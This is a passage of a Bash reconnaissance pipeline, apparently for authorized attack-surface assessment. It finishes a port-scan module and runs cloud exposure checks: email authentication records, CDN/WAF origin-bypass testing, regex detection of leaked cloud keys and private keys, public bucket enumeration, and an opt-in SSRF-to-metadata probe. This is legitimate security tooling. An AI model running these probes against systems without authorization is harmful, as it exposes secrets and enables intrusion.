    local interesting=$(count_lines "$OUTPUT_DIR/14_port_scan/interesting_services.txt")

    if [ $interesting -gt 0 ]; then
        log_info "Found $interesting potentially sensitive services:"
        echo ""
        head -20 "$OUTPUT_DIR/14_port_scan/interesting_services.txt"
        echo ""
    fi

    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    update_statistics "open_ports" "$total_ports"

    # Determine scan status for dashboard
    local scan_status="ok"
    if [ "$naabu_crashed" = "true" ]; then
        scan_status="crashed"
    elif [ "$total_ports" -eq 0 ]; then
        scan_status="no_open_ports"
    fi
    update_statistics "port_scan_status" "\"$scan_status\""

    # Feed the dashboard immediately; nmap enriches these entries in the next module.
    python3 - "$OUTPUT_DIR/14_port_scan/all_ports.jsonl" "$MANIFEST_FILE" << 'PYTHON_EOF'
import json
import sys
from collections import defaultdict

ports = defaultdict(set)
try:
    with open(sys.argv[1]) as source:
        for line in source:
            try:
                item = json.loads(line)
                ports[item['host']].add(int(item['port']))
            except (json.JSONDecodeError, KeyError, TypeError, ValueError):
                continue
except FileNotFoundError:
    pass

with open(sys.argv[2]) as source:
    manifest = json.load(source)
for host, values in ports.items():
    manifest.setdefault('hosts', {}).setdefault(host, {})['ports_open'] = sorted(values)
with open(sys.argv[2], 'w') as destination:
    json.dump(manifest, destination, indent=2)
PYTHON_EOF

    cat > "$output_file" << EOF
{
  "module": "full_port_scan",
  "hosts_scanned": $origin_count,
  "cdn_hosts_tagged": $cdn_host_count,
  "total_ports": $total_ports,
  "origin_ports": $origin_ports_count,
  "cdn_ports": $cdn_ports_count,
  "non_web_ports": $non_web,
  "interesting_services": $interesting,
  "scan_mode": "full_0-65535_all_hosts_tagged",
  "scan_status": "$scan_status",
  "duration_seconds": $duration,
  "duration_minutes": $((duration / 60))
}
EOF

    log_info "Full port scan completed in $((duration / 60)) minutes (status: $scan_status)"
    log_info "Hosts scanned: $origin_count | CDN-tagged: $cdn_host_count | Ports: origin=$origin_ports_count cdn=$cdn_ports_count"
    log_info "Results saved to: $OUTPUT_DIR/14_port_scan/"

    # Fail the module if naabu crashed and retry failed
    [ "$naabu_crashed" = "true" ] && return 1
    echo "$output_file"
}
###################################################################################################
# MODULE 17: CLOUD ATTACK SURFACE EXPOSURE
#
# Detects cloud-native external exposures using existing tools + nuclei, with
# custom ARISE templates for the gaps, then scores every finding with a weighted
# model: weighted_score = base_weight x exploitability x exposure.
#
#   base_weight  - blast radius of the finding class (see BASE_WEIGHT table below)
#   exploitability - detection confidence: 1.0 confirmed unauth access,
#                    0.7 reachable/auth-unknown, 0.4 indicator only (port/DNS)
#   exposure     - internet reachability: 1.0 direct, 0.85 behind CDN (bypassable),
#                    0.6 behind WAF/auth-gated
###################################################################################################

# SPF / DKIM / DMARC posture for the apex domain (native, dig-based).
_cloud_check_email_auth() {
    local domain="$1" out="$2"
    command -v dig &>/dev/null || { echo '{}' > "$out"; return 0; }

    local spf dmarc dkim_found="false" dmarc_policy="none"
    spf=$(dig +short TXT "$domain" 2>/dev/null | tr -d '"' | grep -i 'v=spf1' | head -1)
    dmarc=$(dig +short TXT "_dmarc.$domain" 2>/dev/null | tr -d '"' | grep -i 'v=DMARC1' | head -1)
    if [ -n "$dmarc" ]; then
        dmarc_policy=$(printf '%s' "$dmarc" | grep -oiE 'p=[a-zA-Z]+' | head -1 | cut -d= -f2)
        [ -z "$dmarc_policy" ] && dmarc_policy="none"
    fi
    local sel
    for sel in default google selector1 selector2 k1 mail dkim s1 s2 smtp; do
        if dig +short TXT "${sel}._domainkey.$domain" 2>/dev/null | grep -qiE 'v=DKIM1|k=rsa|p='; then
            dkim_found="true"; break
        fi
    done
    jq -nc --arg spf "$spf" --arg dmarc "$dmarc" --arg policy "$dmarc_policy" --argjson dkim "$dkim_found" \
        '{spf_present:($spf|length>0), spf:$spf, dmarc_present:($dmarc|length>0), dmarc_policy:$policy, dkim_present:$dkim}' \
        > "$out" 2>/dev/null || echo '{}' > "$out"
}

# CDN/WAF origin-bypass test: can a protected host be reached directly on its
# origin IP with the correct Host header, returning the same application?
_cloud_origin_bypass() {
    local out="$1"
    local dns_json="$OUTPUT_DIR/03_dns_resolution/dns_results.json"
    [ ! -f "$dns_json" ] && return 0
    [ ! -f "$MANIFEST_FILE" ] && return 0

    local max="${CLOUD_ORIGIN_MAX:-25}" tested=0
    local protected
    protected=$(jq -r '.hosts | to_entries[]
        | select(.value.cdn==true or (.value.waf_vendor!=null and .value.waf_vendor!="none"))
        | .key' "$MANIFEST_FILE" 2>/dev/null)
    [ -z "$protected" ] && return 0

    while IFS= read -r host; do
        [ -z "$host" ] && continue
        [ "$tested" -ge "$max" ] && break
        local ips
        ips=$(jq -r --arg h "$host" 'select(.host==$h) | .a[]?' "$dns_json" 2>/dev/null | sort -u)
        [ -z "$ips" ] && continue

        local base_len
        base_len=$(curl -sk --max-time 8 "https://$host/" 2>/dev/null | wc -c | tr -d ' ')
        [ "${base_len:-0}" -lt 200 ] && { tested=$((tested+1)); continue; }

        local ip
        while IFS= read -r ip; do
            [ -z "$ip" ] && continue
            local direct_code direct_len diff pct
            direct_code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 8 \
                --resolve "$host:443:$ip" "https://$host/" 2>/dev/null)
            [ "$direct_code" != "200" ] && continue
            direct_len=$(curl -sk --max-time 8 --resolve "$host:443:$ip" "https://$host/" 2>/dev/null | wc -c | tr -d ' ')
            diff=$(( base_len > direct_len ? base_len - direct_len : direct_len - base_len ))
            pct=$(( diff * 100 / (base_len + 1) ))
            if [ "$pct" -lt 15 ]; then
                jq -nc --arg host "$host" --arg ip "$ip" --argjson blen "$base_len" --argjson dlen "$direct_len" \
                    '{host:$host, origin_ip:$ip, cdn_body_len:$blen, direct_body_len:$dlen}' >> "$out"
                break
            fi
        done <<< "$ips"
        tested=$((tested+1))
    done <<< "$protected"
}

# Leaked cloud credentials: reuse trufflehog output, then regex-sweep served JS.
_cloud_credentials() {
    local out="$1"
    local secrets="$OUTPUT_DIR/10_secret_scanning/secrets.json"
    local js_dir="$OUTPUT_DIR/09_crawling/js_downloads"

    if [ -f "$secrets" ]; then
        jq -c '.[]
            | select((.DetectorName // "") | test("AWS|GCP|Google|Azure|Cloud|S3|Gcs|PrivateKey";"i"))
            | {tool:"trufflehog", detector:(.DetectorName//"unknown"),
               file:((.SourceMetadata.Data.Filesystem.file)//""), redacted:(.Redacted//"")}' \
            "$secrets" 2>/dev/null >> "$out" || true
    fi

    if [ -d "$js_dir" ]; then
        python3 - "$js_dir" "$out" << 'CREDEOF'
import sys, os, re, json
js_dir, out = sys.argv[1], sys.argv[2]
patterns = {
    "aws_access_key_id": re.compile(r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b'),
    "google_api_key": re.compile(r'\bAIza[0-9A-Za-z_\-]{35}\b'),
    "gcp_service_account": re.compile(r'"type":\s*"service_account"'),
    "azure_storage_key": re.compile(r'AccountKey=[A-Za-z0-9+/=]{80,}'),
    "private_key_block": re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'),
}
# Build hash-filename -> source URL reverse map from the crawler's index.tsv
url_map = {}
idx = os.path.join(js_dir, "index.tsv")
if os.path.exists(idx):
    for line in open(idx, errors="ignore"):
        parts = line.strip().split("\t")
        if len(parts) == 2:
            url_map[parts[1]] = parts[0]   # hash.js -> https://...
seen = set()
with open(out, "a") as w:
    for root, _, files in os.walk(js_dir):
        for fn in files:
            if not fn.endswith(".js"):
                continue
            fp = os.path.join(root, fn)
            try:
                data = open(fp, errors="ignore").read()
            except Exception:
                continue
            for name, rx in patterns.items():
                m = rx.search(data)
                if not m:
                    continue
                key = (name, fn)
                if key in seen:
                    continue
                seen.add(key)
                source_url = url_map.get(fn, "")
                w.write(json.dumps({"tool": "arise-regex", "detector": name,
                                    "file": fp, "source_url": source_url,
                                    "redacted": m.group(0)[:12] + "..."}) + "\n")
CREDEOF
    fi
}

# ---------------------------------------------------------------------------
# Phase 2 — external, unauthenticated cloud storage enumeration.
# CloudEnum brute-forces bucket/blob names from the target keyword across AWS,
# GCP and Azure; S3Scanner then checks anonymous access on the AWS hits and
# lists contents where the ACL permits. No credentials required — pure recon.
# Writes cloud_buckets.jsonl: {name, provider, access, url, files, note}
# ---------------------------------------------------------------------------
_cloud_venv_check() {
    local tool_name="$1"
    local shim_path
    shim_path="$(command -v "$tool_name" 2>/dev/null)" || return 1
    if [ ! -x "$shim_path" ]; then
        log_warn "  $tool_name: shim at $shim_path is not executable"
        return 1
    fi
    local venv_bin=""
    venv_bin=$(grep -oP '(?<=exec ")[^"]+' "$shim_path" 2>/dev/null \
             || grep -oE '/[^ "]+/.venv/bin/[^ "]+' "$shim_path" 2>/dev/null | head -1)
    if [ -n "$venv_bin" ]; then
        if [ ! -x "$venv_bin" ]; then
            log_warn "  $tool_name: venv target missing ($venv_bin) — reinstall needed"
            return 1
        fi
        local venv_dir="${venv_bin%/bin/*}"
        if [ ! -f "$venv_dir/pyvenv.cfg" ]; then
            log_warn "  $tool_name: venv at $venv_dir looks broken (no pyvenv.cfg)"
            return 1
        fi
    fi
    return 0
}

_cloud_bucket_enum() {
    local target="$1"
    local out="$2"
    : > "$out"

    if [ "$CLOUD_BUCKET_ENUM_ENABLED" != "true" ]; then
        log_info "  Cloud storage enumeration disabled (CLOUD_BUCKET_ENUM_ENABLED=false)"
        return 0
    fi

    # Consolidated multi-cloud storage enumeration + content classification.
    # cloud/cloud_storage_enum.py verifies each candidate and grades it by what is
    # actually exposed (images->low, db/config/creds->critical, 403->low,
    # not-found/private->dropped). No CloudEnum/S3Scanner dependency.
    local script="$PROJECT_ROOT/cloud/cloud_storage_enum.py"
    [ ! -f "$script" ] && script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/cloud/cloud_storage_enum.py"
    if [ ! -f "$script" ] || ! command -v python3 &>/dev/null; then
        log_warn "  cloud/cloud_storage_enum.py or python3 missing; skipping cloud storage enumeration"
        return 0
    fi

    local raw_dir; raw_dir="$(dirname "$out")"
    local keywords_file="$raw_dir/cloud_keywords.txt"
    local preknown_file="$raw_dir/cloud_preknown.txt"
    : > "$keywords_file"; : > "$preknown_file"

    # ---- keywords: apex label + registrable + top subdomain prefixes -------
    { echo "$target"; echo "${target%%.*}"; } >> "$keywords_file"
    local subdomain_file="$OUTPUT_DIR/02_subdomain_enum/all_subdomains.txt"
    if [ -s "$subdomain_file" ]; then
        awk -F. '{print $1}' "$subdomain_file" 2>/dev/null \
            | grep -vE '^(www|mail|ftp|mx|ns[0-9]*|smtp|imap|pop)$' \
            | sort | uniq -c | sort -rn | awk '{print $2}' | head -15 >> "$keywords_file"
    fi
    # Operator-supplied extra keywords (comma-separated)
    if [ -n "${CLOUD_BUCKET_MUTATIONS:-}" ]; then
        echo "$CLOUD_BUCKET_MUTATIONS" | tr ',' '\n' >> "$keywords_file"
    fi
    sort -u -o "$keywords_file" "$keywords_file"

    # ---- pre-known bucket names (verified + classified by the scanner) -----
    # (1) DNS-discovered cloud storage targets (all providers)
    local dnsf
    for dnsf in "$OUTPUT_DIR/03b_dns_discovery"/dns_*_targets.txt; do
        [ -s "$dnsf" ] && cat "$dnsf" >> "$preknown_file"
    done
    # (2) cloud-storage hostnames extracted from crawled URLs by header_analysis
    [ -s "$OUTPUT_DIR/06_header_analysis/s3_url_extractions.txt" ] && \
        cat "$OUTPUT_DIR/06_header_analysis/s3_url_extractions.txt" >> "$preknown_file"
    # (3) direct extraction from the crawl corpus (S3/Azure/GCS/DO/Wasabi)
    if [ -s "$OUTPUT_DIR/09_crawling/all_urls.txt" ]; then
        grep -oiE '[a-z0-9][a-z0-9.-]*\.s3[.-][a-z0-9.-]*amazonaws\.com|s3[.-][a-z0-9.-]*amazonaws\.com/[a-z0-9._-]+|[a-z0-9-]+\.blob\.core\.windows\.net|[a-z0-9][a-z0-9.-]*\.storage\.googleapis\.com|storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9-]+\.[a-z0-9]+\.digitaloceanspaces\.com|[a-z0-9][a-z0-9.-]*\.s3\.wasabisys\.com' \
            "$OUTPUT_DIR/09_crawling/all_urls.txt" 2>/dev/null \
        | sed -E 's#\.s3[.-].*##; s#\.blob\.core\.windows\.net##; s#\.storage\.googleapis\.com##; s#\.[a-z0-9]+\.digitaloceanspaces\.com##; s#\.s3\.wasabisys\.com##; s#^.*/##' \
        >> "$preknown_file"
    fi
    sort -u -o "$preknown_file" "$preknown_file"

    local kw_count pk_count providers
    kw_count=$(count_lines "$keywords_file"); pk_count=$(count_lines "$preknown_file")
    providers="${CLOUD_STORAGE_PROVIDERS:-s3,azure,gcs,digitalocean,wasabi}"
    log_info "  Cloud storage enum: providers=$providers keywords=$kw_count preknown=$pk_count brute=${CLOUD_ENUM_BRUTE:-false}"

    local py_args=("--target" "$target"
                   "--keywords" "$keywords_file"
                   "--mutations" "$PROJECT_ROOT/lists/bucket-mutations.txt"
                   "--providers" "$providers"
                   "--output" "$out"
                   "--threads" "${CLOUD_ENUM_THREADS:-25}"
                   "--timeout" "${CLOUD_ENUM_TIMEOUT:-6}")
    [ -s "$preknown_file" ] && py_args+=("--preknown" "$preknown_file")
    [ -n "${CLOUD_MINIO_HOST:-}" ] && py_args+=("--minio-host" "$CLOUD_MINIO_HOST")
    # Known intentionally-public buckets (CDN/marketing) are downgraded to info
    # to suppress the documented static-asset false positive. Operator-supplied
    # path wins; otherwise fall back to the repo-shipped allowlist.
    local known_public="${CLOUD_KNOWN_PUBLIC:-$PROJECT_ROOT/cloud/known_public.txt}"
    [ -s "$known_public" ] && py_args+=("--known-public" "$known_public")
    # Brute-force is opt-in (slow/noisy); default verifies pre-known names only.
    [ "${CLOUD_ENUM_BRUTE:-false}" != "true" ] && py_args+=("--no-brute")
    # Harvest leaked presigned/SAS URLs from crawled client-side content.
    local presign_corpus=""
    for cf in "$OUTPUT_DIR/09_crawling/all_urls.txt" \
              "$OUTPUT_DIR/06_header_analysis/s3_url_extractions.txt"; do
        [ -s "$cf" ] && presign_corpus="${presign_corpus:+$presign_corpus,}$cf"
    done
    [ -n "$presign_corpus" ] && py_args+=("--presigned-corpus" "$presign_corpus")

    # Per-request --timeout above bounds a single HTTP check, not the total
    # keyword × mutation × provider fan-out — that product can run long on
    # large subdomain lists even when every individual request is fast. Cap
    # the whole invocation so it can never stall the module indefinitely.
    run_tool_timeout "${CLOUD_ENUM_MODULE_TIMEOUT:-600}" cloud_storage_enum python3 "$script" "${py_args[@]}"
    local cse_rc=$?
    if [ "$cse_rc" -eq 124 ]; then
        log_warn "  cloud/cloud_storage_enum.py exceeded ${CLOUD_ENUM_MODULE_TIMEOUT:-600}s cap — killed, continuing with partial results"
    elif [ "$cse_rc" -ne 0 ]; then
        log_warn "  cloud/cloud_storage_enum.py returned non-zero; continuing"
    fi

    local total public denied
    total=$(count_lines "$out")
    public=$(grep -c '"access": "public"' "$out" 2>/dev/null || true); public=${public:-0}
    denied=$(grep -c '"access": "forbidden"' "$out" 2>/dev/null || true); denied=${denied:-0}
    log_info "  Cloud storage findings: $total ($public public, $denied access-denied)"
    if [ "$total" -gt 0 ]; then
        jq -r 'select(.access=="public") | "    [\(.severity)] \(.provider) \(.name) — \(.risk_category) (\(.data_count) obj)"' \
            "$out" 2>/dev/null | head -8 || true
    fi
}

# ---------------------------------------------------------------------------
# Phase 3 — authenticated cloud compliance audit (Prowler / ScoutSuite).
# This scans the target's cloud ACCOUNT from the inside via cloud APIs and
# therefore needs the target's own credentials. It is OFF by default and only
# runs when the operator sets CLOUD_AUDIT_ENABLED=true AND has credentials in
# the environment (auditing your own estate, or authorized post-compromise).
# Writes cloud_compliance.jsonl: {tool, check_id, title, service, severity,
# status, region, resource, framework, remediation}
# ---------------------------------------------------------------------------
_cloud_compliance_audit() {
    local out="$1"
    : > "$out"

    if [ "$CLOUD_AUDIT_ENABLED" != "true" ]; then
        log_info "  Compliance audit disabled (CLOUD_AUDIT_ENABLED=false) — external scan"
        return 0
    fi

    # Refuse to run without credentials rather than emit a misleading empty audit.
    local have_creds="false"
    case "$CLOUD_AUDIT_PROVIDER" in
        aws)   { [ -n "$AWS_ACCESS_KEY_ID" ] || [ -n "$AWS_PROFILE" ]; } && have_creds="true" ;;
        gcp)   [ -n "$GOOGLE_APPLICATION_CREDENTIALS" ] && have_creds="true" ;;
        azure) { [ -n "$AZURE_CLIENT_ID" ] || [ -n "$AZURE_SUBSCRIPTION_ID" ]; } && have_creds="true" ;;
    esac
    if [ "$have_creds" != "true" ]; then
        log_warn "  CLOUD_AUDIT_ENABLED=true but no $CLOUD_AUDIT_PROVIDER credentials in env; skipping audit"
        return 0
    fi

    local raw_dir; raw_dir="$(dirname "$out")"
    log_warn "  Running AUTHENTICATED compliance audit ($CLOUD_AUDIT_TOOL / $CLOUD_AUDIT_PROVIDER) — ensure you are authorized"

    if [ "$CLOUD_AUDIT_TOOL" = "prowler" ] && command -v "$PROWLER" &>/dev/null && _cloud_venv_check "$PROWLER"; then
        local prowler_json="$raw_dir/prowler_output.json"
        run_tool prowler "$PROWLER" "$CLOUD_AUDIT_PROVIDER" -M json-ocsf -o "$raw_dir" -F prowler_output \
            || run_tool prowler "$PROWLER" "$CLOUD_AUDIT_PROVIDER" || true
        # Prowler v4 writes prowler_output.ocsf.json; normalize whatever we find.
        local found; found="$(ls "$raw_dir"/prowler_output*.json 2>/dev/null | head -1)"
        if [ -n "$found" ]; then
            python3 - "$found" "$out" << 'PROWEOF' || true
import sys, json
raw, out = sys.argv[1], sys.argv[2]
try:
    data = json.load(open(raw, errors="ignore"))
except Exception:
    data = []
if isinstance(data, dict):
    data = data.get("findings", [])
sev_map = {"critical":"critical","high":"high","medium":"medium","low":"low",
           "informational":"info","info":"info"}
with open(out, "a") as w:
    for f in data if isinstance(data, list) else []:
        status = (f.get("status_code") or f.get("status") or "").upper()
        if status in ("PASS", "MANUAL"):
            continue
        sev = str(f.get("severity") or f.get("severity_id") or "medium").lower()
        finding = f.get("finding_info", {}) if isinstance(f.get("finding_info"), dict) else {}
        res = f.get("resources", [{}])
        res0 = res[0] if isinstance(res, list) and res else {}
        w.write(json.dumps({
            "tool": "prowler",
            "check_id": f.get("check_id") or finding.get("uid") or "",
            "title": f.get("check_title") or finding.get("title") or f.get("message",""),
            "service": (f.get("service_name") or f.get("cloud",{}).get("provider") or "general"),
            "severity": sev_map.get(sev, "medium"),
            "status": status or "FAIL",
            "region": f.get("region") or res0.get("region",""),
            "resource": res0.get("name") or res0.get("uid",""),
            "framework": "CIS",
            "remediation": (f.get("remediation") or {}).get("desc","") if isinstance(f.get("remediation"),dict) else "",
        }) + "\n")
PROWEOF
        fi
    elif [ "$CLOUD_AUDIT_TOOL" = "scoutsuite" ] && command -v "$SCOUTSUITE" &>/dev/null && _cloud_venv_check "$SCOUTSUITE"; then
        run_tool scoutsuite "$SCOUTSUITE" "$CLOUD_AUDIT_PROVIDER" --report-dir "$raw_dir/scoutsuite" \
            --no-browser || true
        local scout_js; scout_js="$(ls "$raw_dir"/scoutsuite/scoutsuite-results/scoutsuite_results_*.js 2>/dev/null | head -1)"
        if [ -n "$scout_js" ]; then
            python3 - "$scout_js" "$out" << 'SCOUTEOF' || true
import sys, json, re
raw, out = sys.argv[1], sys.argv[2]
txt = open(raw, errors="ignore").read()
txt = re.sub(r'^scoutsuite_results\s*=\s*', '', txt.strip())
try:
    data = json.loads(txt)
except Exception:
    data = {}
services = data.get("services", {})
sev_map = {"danger":"high","warning":"medium","good":"info"}
with open(out, "a") as w:
    for svc, sdata in services.items():
        findings = sdata.get("findings", {})
        for fid, f in findings.items():
            flagged = f.get("flagged_items", 0)
            if not flagged:
                continue
            lvl = (f.get("level") or "warning").lower()
            w.write(json.dumps({
                "tool": "scoutsuite", "check_id": fid,
                "title": f.get("description", fid), "service": svc,
                "severity": sev_map.get(lvl, "medium"), "status": "FAIL",
                "region": "", "resource": "%d flagged" % flagged,
                "framework": "ScoutSuite", "remediation": f.get("rationale",""),
            }) + "\n")
SCOUTEOF
        fi
    else
        log_warn "  Audit tool '$CLOUD_AUDIT_TOOL' not installed; skipping compliance audit"
    fi

    log_info "  Compliance audit: $(count_lines "$out") findings"
}

module_cloud_exposure() {
    local target="$1"
    log_section "MODULE 17: Cloud Attack Surface Exposure"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/17_cloud_exposure"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "cloud_exposure" "results")"

    local http_hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    local nuclei_out="$base_dir/cloud_nuclei.jsonl"
    local email_file="$base_dir/email_auth.json"
    local origin_file="$base_dir/origin_bypass.jsonl"
    local cred_file="$base_dir/cloud_credentials.jsonl"
    local buckets_file="$base_dir/cloud_buckets.jsonl"
    local compliance_file="$base_dir/cloud_compliance.jsonl"
    local findings_file="$base_dir/cloud_findings.jsonl"
    : > "$nuclei_out"; : > "$origin_file"; : > "$cred_file"

    # 1. Curated nuclei pass: custom ARISE templates + cloud-ONLY tags.
    #
    # Uses the same deep-surface consolidated URLs as Module 12 Scan 2 — cloud
    # misconfigs hide in deep paths (/.env, /server-status, /api/v1/metadata),
    # not just host roots. Falls back to http_hosts.txt if consolidator unavailable.
    local tmpl_dir="$PROJECT_ROOT/cloud-templates"
    [ ! -d "$tmpl_dir" ] && tmpl_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/cloud-templates"
    local cloud_tags="aws,s3,bucket,gcs,azure,kubernetes,k8s,kubelet,etcd,metadata"
    local CLOUD_NUCLEI_MAX="${NUCLEI_CLOUD_MAX_TIME:-1200}"  # 20 min cap

    # Build deep-surface URL list (same consolidator as Module 12 Scan 2).
    local cloud_targets="$base_dir/.cloud_targets.txt"
    local consolidator="$PROJECT_ROOT/discovery/nuclei_url_consolidator.py"
    local deep_cap="${NUCLEI_DEEP_URL_CAP:-3000}"
    if [ -f "$consolidator" ] && command -v python3 &>/dev/null; then
        python3 "$consolidator" "$OUTPUT_DIR" \
            --out "$cloud_targets" \
            --cap "$deep_cap" \
            --target-host "$target" 2>/dev/null || true
    fi
    if [ ! -s "$cloud_targets" ]; then
        cp "$http_hosts_file" "$cloud_targets" 2>/dev/null || : > "$cloud_targets"
    fi
    local cloud_url_count=$(count_lines "$cloud_targets")
    log_info "Cloud nuclei input: $cloud_url_count URLs (deep-surface consolidated)"

    if command -v "$NUCLEI" &>/dev/null && [ -s "$cloud_targets" ]; then
        if [ -d "$tmpl_dir" ]; then
            log_info "Running ARISE custom cloud templates ($tmpl_dir) on $cloud_url_count URLs (cap ${CLOUD_NUCLEI_MAX}s)..."
            run_tool_timeout "$CLOUD_NUCLEI_MAX" nuclei_cloud "$NUCLEI" -l "$cloud_targets" -t "$tmpl_dir" \
                -j -silent -rl 100 -duc \
                -max-time "${CLOUD_NUCLEI_MAX}s" >> "$nuclei_out" || true
        else
            log_warn "Custom cloud-templates directory not found; using tags only"
        fi
        log_info "Running nuclei cloud-specific tags on $cloud_url_count URLs (cap ${CLOUD_NUCLEI_MAX}s)..."
        run_tool_timeout "$CLOUD_NUCLEI_MAX" nuclei_cloud "$NUCLEI" -l "$cloud_targets" -tags "$cloud_tags" \
            -severity low,medium,high,critical,unknown -j -silent -rl 100 -duc \
            -max-time "${CLOUD_NUCLEI_MAX}s" >> "$nuclei_out" || true
    else
        log_warn "nuclei unavailable or no targets; skipping cloud nuclei pass"
    fi
    rm -f "$cloud_targets"
    log_info "Cloud nuclei findings: $(count_lines "$nuclei_out")"

    # 1b. Reflected-input false-positive re-check (evidence/nuclei_fp_filter.py).
    # A word-matcher template whose "evidence" words are substrings of its own
    # probe path (the academy.payu.in cloud-metadata-exposure post-mortem —
    # see evidence/arise_evidence.py) fires on any app that echoes the request
    # path back, not just one genuinely running a metadata service. Demotes
    # affected records' severity to info and stamps why; never deletes a row.
    local fp_filter="$PROJECT_ROOT/evidence/nuclei_fp_filter.py"
    [ ! -f "$fp_filter" ] && fp_filter="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/evidence/nuclei_fp_filter.py"
    if [ -f "$fp_filter" ] && [ -s "$nuclei_out" ] && command -v python3 &>/dev/null; then
        python3 "$fp_filter" "$nuclei_out" 2>>"$base_dir/nuclei_fp_filter.log" || true
    fi

    # 2. Email authentication posture (SPF/DKIM/DMARC).
    log_info "Checking email authentication records (SPF/DKIM/DMARC)..."
    _cloud_check_email_auth "$target" "$email_file"

    # 3. CDN/WAF origin-bypass heuristic.
    log_info "Testing protected hosts for CDN/WAF origin bypass..."
    _cloud_origin_bypass "$origin_file"

    # 4. Leaked cloud credentials.
    log_info "Correlating leaked cloud credentials..."
    _cloud_credentials "$cred_file"

    # 5. Phase 2 — external cloud storage enumeration (CloudEnum + S3Scanner).
    log_info "Enumerating public cloud storage (CloudEnum + S3Scanner)..."
    _cloud_bucket_enum "$target" "$buckets_file"

    # 5b. Cloud Asset Intelligence — classify the FULL cloud attack surface
    #     (storage, CDN, LB, API-GW, serverless, k8s, registries, DBs, caches,
    #     queues, static sites, app services, bastion, VPN, DNS) from the DNS
    #     CNAME chains, httpx fingerprints and port scan already on disk.
    #     Writes cloud_asset_map.jsonl + cloud_asset_summary.json.
    local asset_intel="$PROJECT_ROOT/cloud/cloud_asset_intel.py"
    [ ! -f "$asset_intel" ] && asset_intel="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/cloud/cloud_asset_intel.py"
    if [ -f "$asset_intel" ]; then
        log_info "Classifying cloud attack surface (16 service categories)..."
        # Active mode (opt-in) runs read-only banner probes (Redis PING, kubelet
        # /pods, etcd /version, …) to confirm which reachable ports are actually
        # UNAUTHENTICATED — turning "open port" from a guessed critical into a
        # verified one and dropping auth-enforced ports to low. Passive by default.
        local asset_args=("$OUTPUT_DIR")
        [ "${CLOUD_ASSET_ACTIVE:-false}" = "true" ] && asset_args+=("--active")
        python3 "$asset_intel" "${asset_args[@]}" 2>>"$base_dir/cloud_asset_intel.log" || \
            log_warn "cloud/cloud_asset_intel.py returned non-zero; continuing"
    else
        log_warn "cloud/cloud_asset_intel.py not found; skipping cloud asset classification"
    fi

    # 5b. CLOUD DEPTH (C1–C7): recon → cloud takeover chain.
    #     Self-contained modules, each writes a jsonl into $base_dir consumed by
    #     the dashboard + CAPEC attack-path builder (Module L6). All active
    #     behaviour is gated (CLOUD_SSRF_ACTIVE); everything else is passive.
    if [ "${CLOUD_DEPTH_ENABLED:-true}" = "true" ]; then
        # C1 — passive cloud/SaaS attribution (DNS only; zero-touch).
        if [ -f "$PROJECT_ROOT/cloud/cloud_saas_fingerprint.py" ]; then
            log_info "C1: passive cloud/SaaS attribution (MX/TXT/SPF/ADFS)..."
            python3 "$PROJECT_ROOT/cloud/cloud_saas_fingerprint.py" --target "$target" \
                --output "$base_dir/cloud_saas_fingerprint.jsonl" \
                2>>"$base_dir/cloud_depth.log" || log_warn "  C1 non-zero; continuing"
        fi

        # C3 — cloud-credential surface over crawled content + exposed objects.
        # Corpus = the same staged tree Module 10 built for trufflehog
        # (10_secret_scanning/staged/{js_downloads,http_responses_2xx}) — it
        # already carries a url<TAB>filename index.tsv per subdir, which the
        # Module 17 fold below uses to attribute each leaked credential back
        # to its real source URL instead of the scan's bare apex domain.
        # ("09_web_crawling" never existed — this pipeline's crawl output
        # dir is "09_crawling" — so this corpus was effectively empty before.)
        if [ -f "$PROJECT_ROOT/cloud/cloud_cred_scan.py" ]; then
            log_info "C3: cloud-credential surface scan..."
            local _cred_corpus=()
            [ -d "$OUTPUT_DIR/10_secret_scanning/staged/js_downloads" ] && \
                _cred_corpus+=("$OUTPUT_DIR/10_secret_scanning/staged/js_downloads"/*)
            [ -d "$OUTPUT_DIR/10_secret_scanning/staged/http_responses_2xx" ] && \
                _cred_corpus+=("$OUTPUT_DIR/10_secret_scanning/staged/http_responses_2xx"/*)
            if [ "${#_cred_corpus[@]}" -gt 0 ]; then
                python3 "$PROJECT_ROOT/cloud/cloud_cred_scan.py" --corpus ${_cred_corpus[@]} \
                    --output "$base_dir/cloud_credentials.jsonl" \
                    2>>"$base_dir/cloud_depth.log" || log_warn "  C3 non-zero; continuing"
            fi
        fi

        # C4 — SSRF→IMDS metadata lane (active only when CLOUD_SSRF_ACTIVE=true).
        if [ -f "$PROJECT_ROOT/cloud/ssrf_metadata.py" ]; then
            local _ep="$OUTPUT_DIR/08_directory_discovery/discovered_endpoints.jsonl"
            [ ! -f "$_ep" ] && _ep="$OUTPUT_DIR/discovered_endpoints.jsonl"
            if [ -f "$_ep" ]; then
                log_info "C4: SSRF→cloud-metadata lane (active=${CLOUD_SSRF_ACTIVE:-false})..."
                local _ssrf_args=(--endpoints "$_ep" --output "$base_dir/ssrf_metadata.jsonl")
                [ "${CLOUD_SSRF_ACTIVE:-false}" = "true" ] && _ssrf_args+=(--active)
                [ -n "${CLOUD_SSRF_OOB:-}" ] && _ssrf_args+=(--oob-domain "$CLOUD_SSRF_OOB")
                python3 "$PROJECT_ROOT/cloud/ssrf_metadata.py" "${_ssrf_args[@]}" \
                    2>>"$base_dir/cloud_depth.log" || log_warn "  C4 non-zero; continuing"
            fi
        fi

        # C5 — control-presence inversion (consumes C1–C4 + bucket outputs).
        if [ -f "$PROJECT_ROOT/cloud/cloud_posture.py" ]; then
            log_info "C5: control-presence inversion (guardrail gaps)..."
            python3 "$PROJECT_ROOT/cloud/cloud_posture.py" --scan-dir "$base_dir" \
                --output "$base_dir/cloud_posture.jsonl" \
                2>>"$base_dir/cloud_depth.log" || log_warn "  C5 non-zero; continuing"
        fi
        # (C2 storage grading is inline in cloud_storage_enum; C6 chains run in
